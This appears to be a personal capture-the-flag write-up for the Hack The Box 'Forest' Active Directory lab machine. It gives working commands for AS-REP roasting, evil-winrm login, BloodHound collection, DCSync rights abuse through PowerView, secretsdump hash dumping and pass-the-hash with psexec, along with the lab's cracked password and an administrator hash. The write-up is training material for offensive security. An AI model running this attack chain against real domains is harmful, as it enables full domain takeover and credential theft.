# Enumeration 
Windows Server 2016 Standard 14393 x64 
name:FOREST
domain:htb.local

## open ports

```
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-20 06:31:08Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Port 53

No zone transfer

### Port 135
`rpcclient -U% $ip `

![[Pasted image 20230120083329.png]]

users:
svc-alfresco
lucinda
andy
mark
santi

svc-alfresco looks interesting cos it's service account
trying ASP-roasting

`GetNPUsers.py htb.local/svc-alfresco -no-pass`
![[Pasted image 20230120083557.png]]
it worked!

# Privesc 

using evil-wirm to login 
`evil-winrm -i $ip -u svc-alfresco -p 's3rvice'`
![[Pasted image 20230120083856.png]]
using evil-wirm to login 


running impacket bloodhound to collect info about the domain
`bloodhound-python --dns-tcp -ns $ip -d htb.local -u 'svc-alfresco' -p 's3rvice' -c all`

![[Pasted image 20230120114650.png]]


our user svc-alfresco is a member of Account Operators and Account Operators has GenericAll on Exchange Windows Permissions which has WriteDacl perm on the domain which means:
1. Create new user 
2. add the new user to Exchange windows permissions group
3.  give new user DCSync rights
4. dump hashes with secrets dump 
![[Pasted image 20230120120939.png]]

```
. .\PowerView-Dev.ps1 # run powerview 
net user super Password1 /add
dd-ADGroupMember -Identity "EXCHANGE WINDOWS PERMISSIONS" -Members super # add super to group
$SecPassword = ConvertTo-SecureString 'Password1' -AsPlainText -Force # add password string
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\super', $SecPassword) # add creds with new user super
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -Rights DCSync -Principa
lIdentity super -Verbose -Domain htb.local # give user DCSync rights 
secretsdump.py htb.local/super:Password1@$ip  # dump hashes
```

![[Pasted image 20230120121229.png]]
`psexec.py administrator:@$ip -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`

![[Pasted image 20230120121254.png]]


# Loot

svc-alfresco user creds:
	username: svc-alfresco
	password: s3rvice


---
Tags: #ctf #htb #AD #ASP_roasting #secretsdump #DCSync #rpc
Resources: [Forest](https://app.hackthebox.com/machines/212)